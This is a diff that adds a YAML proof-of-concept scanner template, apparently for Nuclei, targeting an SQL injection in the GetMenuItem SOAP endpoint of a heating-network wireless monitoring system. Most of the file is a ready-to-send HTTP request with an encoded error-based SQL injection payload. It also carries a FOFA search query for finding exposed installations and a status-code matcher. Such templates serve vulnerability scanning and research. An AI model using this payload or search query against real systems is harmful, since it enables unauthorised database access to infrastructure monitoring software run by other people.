@@ -1,0 +1,19 @@
+id: poc-suidv2sa6gg3pgcu
+info:
+  name: 热网无线监测系统GetMenuItem存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/suidv2sa6gg3pgcu'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: suidv2sa6gg3pgcu
+    fofa: body="Downloads/HDPrintInstall.rar" || body="skins/login/images/btn_login.jpg"
+http:
+- raw:
+  - "POST /DataSrvs/UCCGSrv.asmx HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nCookie: ASP.NET_SessionId=etxlbzrbmcecvsuy1fwjnfzy\nUpgrade-Insecure-Requests: 1\nPriority: u=1\nSOAPAction: [http://tempuri.org/GetMenuItem](http://tempuri.org/GetMenuItem)\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 498\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:GetMenuItem>\n         <!--type: string-->\n         <tem:name>gero et') AND 1829 IN (SELECT (CHAR(113)+CHAR(106)+CHAR(98)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (1829=1829) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(106)+CHAR(107)+CHAR(113)))-- UwEA</tem:name>\n      </tem:GetMenuItem>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
